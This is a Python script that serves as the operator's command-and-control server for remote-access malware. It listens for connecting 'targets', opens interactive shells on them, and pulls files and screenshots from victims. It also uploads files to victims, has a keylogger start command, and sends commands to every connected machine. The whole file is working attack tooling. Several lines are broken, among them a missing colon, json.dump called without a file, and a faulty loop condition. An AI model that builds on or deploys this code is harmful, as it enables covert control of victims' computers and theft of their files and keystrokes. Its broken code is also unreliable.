#!/usr/bin/python

import socket
import json
import os
import base64
import threading


count = 0


def send_to_all(target,command):
    json_data = json.dump(command)
    target.send(json_data)


def shell(target,ip):
    def reliable_send(data):
        json_data = json.dump(data)
        target.send(json_data)

    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    global count
    while True:
        command = raw_input("* Shell#~%s: " %str(ip))
        reliable_send(command)
        if command == "q":
            break
        elif command == "exit"
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            # wb = write bytes 
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                # rb = read bytes
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to Upload"
                reliable_send(base64.b64encode(failed))
        elif command[:10] == "screenshot":
            with open("screenshot%d" %  count, "wb") as screen:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded[:4] == "[!!]":
                    print(image_decoded)
                else:
                    screen.write(image_decoded)
                    count += 1
        elif command[:12] == "keylog_start":
            continue
        else:
            result = reliable_recv()
            print(result)


def server():
    global clients
    while True:
        if stop_threads:
            break
        soc.settimeout(1)
        try:
            target, ip = soc.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + " --- " + str(ips[clients]) + " has connected.")
            clients += 1
        except:
            pass


global soc
ips = []
targets = []
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
soc.bind(("10.0.0.1", 54321))
soc.listen(5)

clients = 0
stop_threads = False

print("[+] Waiting for targets to connect...")

t1 = threading.Thread(target=server)
t1.start()

while True:
    command = raw_input("* Command Center: ")
    if command == "targets":
        count = 0
        for ip in ips:
            print("Session " + str(count) + ". <---> " + str(ip))
            count += 1
    elif command[:7] == "session":
        try:
            num = int(command[8:])
            target_num = targets[num]
            target_ip = ips[num]
            shell(target_num, target_ip)
        except:
            print("[!] No session under that number!")
    elif command == "exit":
        for target in targets:
            target.close()
        soc.close()
        stop_threads = True
        t1.join()
        break
    elif command[:7] == "sendall":
        length_of_targets = len(targets)
        i = 0
        try:
            while 1 < length_of_targets:
                tar_num = targets[i]
                print tar_num
                send_to_all(tar_num, command)
                i += 1
        except:
            print("[!] Failed to send command to all targets") 
    else:
        print("[!!] Command does not exits!!")

